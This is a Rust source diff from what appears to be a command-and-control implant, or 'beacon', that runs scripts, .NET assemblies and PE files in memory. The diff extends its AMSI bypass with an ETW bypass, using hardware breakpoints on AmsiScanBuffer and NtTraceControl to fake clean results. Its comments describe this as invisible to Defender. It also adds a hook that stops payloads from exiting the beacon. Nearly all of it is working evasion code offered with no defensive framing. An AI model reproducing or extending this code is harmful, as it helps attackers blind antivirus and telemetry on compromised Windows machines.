@@ -183,19 +183,19 @@ fn _script_exec_impl(script_bytes: &[u8], args: &str, amsi_bypass: bool) -> Stri
             else if first_line.contains("bash") { Interp::Bash }
             else { Interp::Sh }
         } else {
-            #[cfg(windows)] { Interp::Powershell }
+            #[cfg(windows)] { Interp::Cmd }
             #[cfg(not(windows))] { Interp::Sh }
         }
     };
 
-    #[cfg(windows)]
+    #[cfg(all(windows, not(stratum_naked)))]
     let amsi_hwbp: Option<AmsiHwbp> = if amsi_bypass && interp == Interp::Powershell {
         let bp = _amsi_hwbp_install();
         if bp.is_some() { crate::dlog!("script", "AMSI bypass: HW breakpoint set on AmsiScanBuffer"); }
         bp
     } else { None };
 
-    #[cfg(not(windows))]
+    #[cfg(any(not(windows), stratum_naked))]
     let _ = amsi_bypass;
 
     let spawn_result = {
@@ -268,7 +268,7 @@ fn _script_exec_impl(script_bytes: &[u8], args: &str, amsi_bypass: bool) -> Stri
     let mut child = match spawn_result {
         Ok(c) => c,
         Err(e) => {
-            #[cfg(windows)]
+            #[cfg(all(windows, not(stratum_naked)))]
             if let Some(bp) = amsi_hwbp { _amsi_hwbp_remove(bp); }
             return format!("[script] Failed to spawn interpreter: {}", e);
         }
@@ -311,7 +311,7 @@ fn _script_exec_impl(script_bytes: &[u8], args: &str, amsi_bypass: bool) -> Stri
         Err(_) => "[script] Execution timed out (120s)".to_string(),
     };
 
-    #[cfg(windows)]
+    #[cfg(all(windows, not(stratum_naked)))]
     if let Some(bp) = amsi_hwbp {
         _amsi_hwbp_remove(bp);
         crate::dlog!("script", "AMSI bypass: HW breakpoint removed");
@@ -332,13 +332,10 @@ fn _script_exec_impl(script_bytes: &[u8], args: &str, amsi_bypass: bool) -> Stri
 // E_INVALIDARG and skips the function body.  Zero VirtualProtect, zero memory
 // writes on amsi.dll — invisible to Defender Behavior:Win32/AMSI_Patch_T.
 
-// ── stratum_naked stubs: AMSI bypass is a no-op when loader handles evasion ──
-#[cfg(all(windows, stratum_naked))]
-struct AmsiHwbp { _dummy: u8 }
-#[cfg(all(windows, stratum_naked))]
-fn _amsi_hwbp_install() -> Option<AmsiHwbp> { None }
-#[cfg(all(windows, stratum_naked))]
-fn _amsi_hwbp_remove(_bp: AmsiHwbp) {}
+// AMSI + ETW HWBP bypass — mirrors what the loader sets on its main thread:
+//   DR0 = AmsiScanBuffer  (AMSI)   → return E_INVALIDARG
+//   DR1 = NtTraceControl  (ETW)    → return STATUS_SUCCESS
+// Needed because HWBP is per-thread and the beacon runs on a different thread.
 
 #[cfg(all(windows, not(stratum_naked)))]
 struct AmsiHwbp {
@@ -350,6 +347,8 @@ unsafe impl Send for AmsiHwbp {}
 
 #[cfg(all(windows, not(stratum_naked)))]
 static AMSI_SCAN_BUF_ADDR: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
+#[cfg(all(windows, not(stratum_naked)))]
+static ETW_TRACE_CTRL_ADDR: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
 
 #[cfg(all(windows, not(stratum_naked)))]
 unsafe extern "system" fn _amsi_veh_handler(exception_info: *mut u8) -> i32 {
@@ -357,54 +356,47 @@ unsafe extern "system" fn _amsi_veh_handler(exception_info: *mut u8) -> i32 {
     const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
     const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;
 
-    // EXCEPTION_POINTERS layout: *EXCEPTION_RECORD, *CONTEXT
     let exception_record = *(exception_info as *const *const u8);
     let context_ptr = *((exception_info as *const *mut u8).add(1));
 
-    // EXCEPTION_RECORD: ExceptionCode is first DWORD
     let code = *(exception_record as *const u32);
     if code != EXCEPTION_SINGLE_STEP {
         return EXCEPTION_CONTINUE_SEARCH;
     }
 
-    // x86_64 CONTEXT offsets (CONTEXT_AMD64):
-    //   0x030: ContextFlags (DWORD)
-    //   0x048: Dr0  (u64)
-    //   0x050: Dr1  (u64)
-    //   0x058: Dr2  (u64)
-    //   0x060: Dr3  (u64)
-    //   0x068: Dr6  (u64)
-    //   0x070: Dr7  (u64)
-    //   0x078: Rax  (u64)
-    //   0x098: Rsp  (u64)
-    //   0x0F8: Rip  (u64)
+    // x86_64 CONTEXT offsets:
+    //   0x048: Dr0   0x050: Dr1   0x070: Dr7
+    //   0x078: Rax   0x098: Rsp   0x0F8: Rip
     let rip = *((context_ptr.add(0xF8)) as *const u64);
-    let target = AMSI_SCAN_BUF_ADDR.load(std::sync::atomic::Ordering::Relaxed) as u64;
-    if target == 0 || rip != target {
-        return EXCEPTION_CONTINUE_SEARCH;
+
+    let amsi_target = AMSI_SCAN_BUF_ADDR.load(std::sync::atomic::Ordering::Relaxed) as u64;
+    let etw_target  = ETW_TRACE_CTRL_ADDR.load(std::sync::atomic::Ordering::Relaxed) as u64;
+
+    // DR0 hit: AmsiScanBuffer → RAX = E_INVALIDARG (0x80070057)
+    if amsi_target != 0 && rip == amsi_target {
+        *((context_ptr.add(0x78)) as *mut u64) = 0x80070057u64;
+        let rsp = *((context_ptr.add(0x98)) as *const u64);
+        *((context_ptr.add(0xF8)) as *mut u64) = *(rsp as *const u64);
+        *((context_ptr.add(0x98)) as *mut u64) = rsp + 8;
+        return EXCEPTION_CONTINUE_EXECUTION;
     }
 
-    // Set RAX = E_INVALIDARG (0x80070057) — AMSI_RESULT_CLEAN path
-    *((context_ptr.add(0x78)) as *mut u64) = 0x80070057u64;
+    // DR1 hit: NtTraceControl → RAX = STATUS_SUCCESS (0)
+    if etw_target != 0 && rip == etw_target {
+        *((context_ptr.add(0x78)) as *mut u64) = 0u64;
+        let rsp = *((context_ptr.add(0x98)) as *const u64);
+        *((context_ptr.add(0xF8)) as *mut u64) = *(rsp as *const u64);
+        *((context_ptr.add(0x98)) as *mut u64) = rsp + 8;
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
 
-    // Set RIP to return address: dereference RSP (top of stack = return addr)
-    let rsp = *((context_ptr.add(0x98)) as *const u64);
-    let ret_addr = *(rsp as *const u64);
-    *((context_ptr.add(0xF8)) as *mut u64) = ret_addr;
-
-    // Advance RSP past the return address (simulate ret)
-    *((context_ptr.add(0x98)) as *mut u64) = rsp + 8;
-
-    // Clear DR0 so the breakpoint doesn't re-fire on next call
-    // (we re-arm per install, not per call)
-    // Actually: leave DR0 set so repeated AmsiScanBuffer calls are also caught
-
-    EXCEPTION_CONTINUE_EXECUTION
+    EXCEPTION_CONTINUE_SEARCH
 }
 
 #[cfg(all(windows, not(stratum_naked)))]
 fn _amsi_hwbp_install() -> Option<AmsiHwbp> {
     unsafe {
+        // ── Resolve AmsiScanBuffer ──
         let amsi_name = sb!("amsi.dll");
         let amsi_mod = crate::dynapi::load_library_a(amsi_name.as_ptr()) as *mut std::ffi::c_void;
         if amsi_mod.is_null() { return None; }
@@ -414,32 +406,49 @@ fn _amsi_hwbp_install() -> Option<AmsiHwbp> {
         if scan_addr == 0 { return None; }
 
         AMSI_SCAN_BUF_ADDR.store(scan_addr, std::sync::atomic::Ordering::SeqCst);
+        crate::dlog!("hwbp", "AmsiScanBuffer @ 0x{:x}", scan_addr);
 
+        // ── Resolve NtTraceControl ──
+        let ntdll_name = sb!("ntdll.dll");
+        let ntdll_mod = crate::dynapi::load_library_a(ntdll_name.as_ptr()) as *mut std::ffi::c_void;
+        let etw_addr = if !ntdll_mod.is_null() {
+            let etw_name = sb!("NtTraceControl");
+            let addr = crate::dynapi::get_proc_address(ntdll_mod, etw_name.as_ptr()) as usize;
+            if addr != 0 {
+                crate::dlog!("hwbp", "NtTraceControl @ 0x{:x}", addr);
+                ETW_TRACE_CTRL_ADDR.store(addr, std::sync::atomic::Ordering::SeqCst);
+            }
+            addr
+        } else { 0 };
+
+        // ── Install VEH ──
         let veh = crate::dynapi::add_vectored_exception_handler(1, _amsi_veh_handler);
         if veh.is_null() { return None; }
 
-        // CONTEXT size for x86_64: 1232 bytes, must be 16-byte aligned
+        // ── Set debug registers ──
         let mut ctx_buf = vec![0u8; 1232];
         let ctx = ctx_buf.as_mut_ptr();
+        *(ctx.add(0x30) as *mut u32) = 0x0010_0010; // CONTEXT_DEBUG_REGISTERS
 
-        // ContextFlags = CONTEXT_DEBUG_REGISTERS (0x00100010)
-        *(ctx.add(0x30) as *mut u32) = 0x0010_0010;
-
-        // -2 is pseudo-handle for current thread
         if crate::dynapi::get_thread_context(-2isize, ctx) == 0 {
             crate::dynapi::remove_vectored_exception_handler(veh);
             return None;
         }
 
-        // DR0 = AmsiScanBuffer address
+        // DR0 = AmsiScanBuffer
         *(ctx.add(0x48) as *mut u64) = scan_addr as u64;
 
-        // DR7: enable DR0 local breakpoint (bit 0 = 1), execute-on-access (bits 16-17 = 00)
         let mut dr7 = *(ctx.add(0x70) as *const u64);
-        dr7 |= 1; // L0 = local enable for DR0
-        // Condition for DR0 (bits 16-17): 00 = execution breakpoint (already default)
-        // Length for DR0 (bits 18-19): 00 = 1-byte (required for exec BP)
-        dr7 &= !(0xFu64 << 16); // clear condition+length bits for DR0
+        dr7 |= 1;                    // L0 = enable DR0
+        dr7 &= !(0xFu64 << 16);     // DR0: execute, 1-byte
+
+        // DR1 = NtTraceControl (if resolved)
+        if etw_addr != 0 {
+            *(ctx.add(0x50) as *mut u64) = etw_addr as u64;
+            dr7 |= 1 << 2;           // L1 = enable DR1
+            dr7 &= !(0xFu64 << 20);  // DR1: execute, 1-byte
+        }
+
         *(ctx.add(0x70) as *mut u64) = dr7;
 
         if crate::dynapi::set_thread_context(-2isize, ctx) == 0 {
@@ -447,6 +456,7 @@ fn _amsi_hwbp_install() -> Option<AmsiHwbp> {
             return None;
         }
 
+        crate::dlog!("hwbp", "DR0+DR1 set, VEH installed");
         Some(AmsiHwbp { veh_handle: veh })
     }
 }
@@ -454,20 +464,22 @@ fn _amsi_hwbp_install() -> Option<AmsiHwbp> {
 #[cfg(all(windows, not(stratum_naked)))]
 fn _amsi_hwbp_remove(bp: AmsiHwbp) {
     unsafe {
-        // Clear DR0 and DR7 local-enable bit
         let mut ctx_buf = vec![0u8; 1232];
         let ctx = ctx_buf.as_mut_ptr();
         *(ctx.add(0x30) as *mut u32) = 0x0010_0010;
         if crate::dynapi::get_thread_context(-2isize, ctx) != 0 {
             *(ctx.add(0x48) as *mut u64) = 0; // DR0 = 0
+            *(ctx.add(0x50) as *mut u64) = 0; // DR1 = 0
             let mut dr7 = *(ctx.add(0x70) as *const u64);
-            dr7 &= !1u64; // clear L0
+            dr7 &= !0x5u64; // clear L0 + L1
             *(ctx.add(0x70) as *mut u64) = dr7;
             crate::dynapi::set_thread_context(-2isize, ctx);
         }
 
         crate::dynapi::remove_vectored_exception_handler(bp.veh_handle);
         AMSI_SCAN_BUF_ADDR.store(0, std::sync::atomic::Ordering::SeqCst);
+        ETW_TRACE_CTRL_ADDR.store(0, std::sync::atomic::Ordering::SeqCst);
+        crate::dlog!("hwbp", "DR0+DR1 cleared, VEH removed");
     }
 }
 
@@ -1410,6 +1422,9 @@ fn _assembly_exec_windows(assembly_bytes: &[u8], args: &str, amsi_bypass: bool) 
             }
         }
 
+        #[cfg(stratum_naked)]
+        let _ = amsi_bypass;
+        #[cfg(not(stratum_naked))]
         let amsi_hwbp: Option<AmsiHwbp> = if amsi_bypass {
             let bp = _amsi_hwbp_install();
             if bp.is_some() { crate::dlog!("assembly", "AMSI bypass: HW breakpoint set on AmsiScanBuffer"); }
@@ -1462,24 +1477,17 @@ fn _assembly_exec_windows(assembly_bytes: &[u8], args: &str, amsi_bypass: bool) 
         let argv: Vec<&str> = if args.is_empty() { vec![] } else { args.split_whitespace().collect() };
         let params = _build_invoke_params(&argv);
 
-        // Spawn reader thread to drain pipe — prevents deadlock when output > pipe buffer
-        let reader = {
-            let rd_handle = rd as usize;
-            std::thread::spawn(move || {
-                let rd = rd_handle as isize;
-                let mut output = Vec::new();
-                let mut rbuf = [0u8; 8192];
-                loop {
-                    let mut n = 0u32;
-                    use windows_sys::Win32::Storage::FileSystem::ReadFile;
-                    let ok = unsafe { ReadFile(rd, rbuf.as_mut_ptr() as _, rbuf.len() as u32, &mut n, std::ptr::null_mut()) };
-                    if ok == 0 || n == 0 { break; }
-                    output.extend_from_slice(&rbuf[..n as usize]);
-                    if output.len() > 4 * 1024 * 1024 { break; }
-                }
-                output
-            })
-        };
+        // Drain pipe via raw Win32 CreateThread — Rust thread::spawn crashes
+        // in reflective-DLL context (no DLL_THREAD_ATTACH → TLS AV).
+        let _ = _take_pipe_output(); // clear any stale data
+        let reader_handle = crate::dynapi::create_thread(
+            std::ptr::null_mut(), 0, _pipe_reader,
+            rd as *mut std::ffi::c_void, 0, std::ptr::null_mut(),
+        );
+        crate::dlog!("assembly", "reader thread handle=0x{:x}", reader_handle as usize);
+
+        // Prevent .NET Environment.Exit() from killing the beacon
+        _install_exit_process_hook();
 
         // _MethodInfo::Invoke_3 — vtable slot 37
         // VARIANT is 16 bytes on x64: 8-byte header (vt + 3 reserved WORDs) + 8-byte union
@@ -1492,15 +1500,20 @@ fn _assembly_exec_windows(assembly_bytes: &[u8], args: &str, amsi_bypass: bool) 
         let _hr = invoke_3(mi, empty_var, params, &mut ret_var);
         crate::dlog!("assembly", "Invoke_3 returned hr=0x{:08x}", _hr as u32);
 
+        #[cfg(not(stratum_naked))]
         if let Some(bp) = amsi_hwbp {
             _amsi_hwbp_remove(bp);
             crate::dlog!("assembly", "AMSI bypass: HW breakpoint removed");
         }
 
-        // Close write end so reader thread gets EOF, then collect output
+        // Close write end → reader gets EOF, then collect output
         CloseHandle(wr);
         SetStdHandle(STD_OUTPUT_HANDLE, old_out);
-        let output = reader.join().unwrap_or_default();
+        if reader_handle != 0 {
+            crate::dynapi::wait_for_single_object(reader_handle, 10_000);
+            crate::dynapi::close_handle(reader_handle);
+        }
+        let output = _take_pipe_output();
         CloseHandle(rd);
         if !params.is_null() { SafeArrayDestroy(params as *mut _); }
 
@@ -2065,6 +2078,7 @@ fn _memexec_windows(pe_data: &[u8], args: &str) -> String {
         let entry_addr = base + oep_rva;
         let ctx = Box::into_raw(Box::new(ExecCtx { entry: entry_addr, _args: argv }));
 
+        #[cfg(not(stratum_naked))]
         unsafe extern "system" fn _pe_thread(param: *mut std::ffi::c_void) -> u32 {
             extern "system" { fn GetCurrentThreadId() -> u32; }
             GUARDED_THREAD_ID.store(GetCurrentThreadId(), std::sync::atomic::Ordering::Relaxed);
@@ -2082,10 +2096,26 @@ fn _memexec_windows(pe_data: &[u8], args: &str) -> String {
             }
         }
 
+        #[cfg(stratum_naked)]
+        unsafe extern "system" fn _pe_thread(param: *mut std::ffi::c_void) -> u32 {
+            let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+                let ctx = Box::from_raw(param as *mut ExecCtx);
+                type EntryFn = unsafe extern "system" fn() -> u32;
+                let entry: EntryFn = std::mem::transmute(ctx.entry);
+                entry()
+            }));
+            match result {
+                Ok(ret) => ret,
+                Err(_) => 0xDEAD0003,
+            }
+        }
+
+        #[cfg(not(stratum_naked))]
         extern "system" {
             fn AddVectoredExceptionHandler(first: u32, handler: unsafe extern "system" fn(*mut std::ffi::c_void) -> i32) -> *mut std::ffi::c_void;
             fn RemoveVectoredExceptionHandler(handle: *mut std::ffi::c_void) -> u32;
         }
+        #[cfg(not(stratum_naked))]
         let veh = AddVectoredExceptionHandler(1, _guarded_veh_handler);
 
         crate::dlog!("memexec", "launching PE thread, entry=0x{:x}", entry_addr);
@@ -2093,6 +2123,7 @@ fn _memexec_windows(pe_data: &[u8], args: &str) -> String {
             std::ptr::null_mut(), 0, _pe_thread, ctx as *mut std::ffi::c_void, 0, std::ptr::null_mut(),
         );
         if th == 0 {
+            #[cfg(not(stratum_naked))]
             RemoveVectoredExceptionHandler(veh);
             SetStdHandle(STD_OUTPUT_HANDLE, old_out);
             crate::dynapi::close_handle(wr);
@@ -2119,7 +2150,10 @@ fn _memexec_windows(pe_data: &[u8], args: &str) -> String {
         GetExitCodeThread(th, &mut exit_code);
         crate::dlog!("memexec", "PE thread exit_code=0x{:x}", exit_code);
 
+        #[cfg(not(stratum_naked))]
         let veh_crash = GUARDED_CRASH_CODE.load(std::sync::atomic::Ordering::Relaxed);
+        #[cfg(stratum_naked)]
+        let veh_crash: u32 = 0;
         let timed_out = exit_code == 259; // STILL_ACTIVE
         let crashed = veh_crash != 0 || (!timed_out && exit_code >= 0xC0000000);
 
@@ -2128,8 +2162,11 @@ fn _memexec_windows(pe_data: &[u8], args: &str) -> String {
             TerminateThread(th, 1);
         }
         crate::dynapi::close_handle(th);
-        RemoveVectoredExceptionHandler(veh);
-        GUARDED_THREAD_ID.store(0, std::sync::atomic::Ordering::Relaxed);
+        #[cfg(not(stratum_naked))]
+        {
+            RemoveVectoredExceptionHandler(veh);
+            GUARDED_THREAD_ID.store(0, std::sync::atomic::Ordering::Relaxed);
+        }
 
         // Restore stdout and close write end (signals EOF to reader)
         crate::dynapi::close_handle(wr);
